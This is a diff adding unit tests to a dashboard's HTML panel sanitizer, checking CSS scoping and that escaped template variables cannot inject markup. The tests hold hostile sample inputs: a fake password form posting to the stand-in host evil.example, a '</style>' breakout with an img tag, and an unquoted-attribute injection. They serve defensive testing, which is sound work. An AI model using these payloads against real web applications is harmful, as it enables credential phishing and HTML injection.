@@ -21,6 +21,10 @@ import {
   isAllowedIframeSrc,
   sanitizeHtmlPanel,
 } from "@/utils/dashboard/htmlPanelSanitizer";
+import {
+  escapeHtmlValue,
+  processVariableContent,
+} from "@/utils/dashboard/variables/variablesUtils";
 
 const ORIGIN = "https://o2.example.com";
 
@@ -111,6 +115,71 @@ describe("htmlPanelSanitizer", () => {
       );
 
       expect(out.querySelector("style")?.textContent).toContain("(width < 37.5rem)");
+    });
+
+    it("scopes rules nested in @layer and @container blocks", () => {
+      const css = render(
+        "<style>@layer base { .a { color: red; } } " +
+          "@container (min-width: 1px) { .b { color: blue; } }</style>",
+      ).querySelector("style")?.textContent;
+
+      expect(css).toContain("#o2-html-panel-p1 .a");
+      expect(css).toContain("#o2-html-panel-p1 .b");
+      expect(css).not.toMatch(/\{\s*\.(a|b)\s*\{/);
+    });
+
+    it("renders an HTML-escaped variable value as text, never as a form", () => {
+      const payload =
+        '<form action="https://evil.example/x"><input type="password" name="p"><button>Login</button></form>';
+      const out = render(
+        processVariableContent(
+          "<div title='${x}'>Hello ${x}</div>",
+          { values: [{ name: "x", type: "textbox", value: payload }] },
+          undefined,
+          escapeHtmlValue,
+        ),
+      );
+
+      expect(out.querySelector("form")).toBeNull();
+      expect(out.querySelector("input")).toBeNull();
+      expect(out.querySelector("div")?.textContent).toBe(`Hello ${payload}`);
+      expect(out.querySelector("div")?.getAttribute("title")).toBe(payload);
+    });
+
+    it("decodes escaped values in panel CSS without letting them close the style element", () => {
+      const styleFor = (value: string) =>
+        render(
+          processVariableContent(
+            "<style>.a { font-family: ${x}; }</style><p>ok</p>",
+            { values: [{ name: "x", type: "textbox", value }] },
+            undefined,
+            escapeHtmlValue,
+          ),
+        );
+
+      expect(styleFor("'Fira Code', serif").querySelector("style")?.textContent).toContain(
+        'font-family: "Fira Code", serif',
+      );
+      const out = styleFor("x</style><img src=x>");
+      const reparsed = document.createElement("div");
+      reparsed.innerHTML = out.innerHTML;
+      expect(out.querySelector("style")?.textContent).not.toContain("</");
+      expect(reparsed.querySelector("img")).toBeNull();
+    });
+
+    it("keeps an escaped value in an unquoted attribute from adding attributes", () => {
+      const value = "x style=position:fixed;inset:0";
+      const out = render(
+        processVariableContent(
+          "<a class=${x}>t</a>",
+          { values: [{ name: "x", type: "textbox", value }] },
+          undefined,
+          escapeHtmlValue,
+        ),
+      );
+
+      expect(out.querySelector("a")?.hasAttribute("style")).toBe(false);
+      expect(out.querySelector("a")?.getAttribute("class")).toBe(value);
     });
 
     it("registers its iframe hook once, on a private DOMPurify instance", () => {
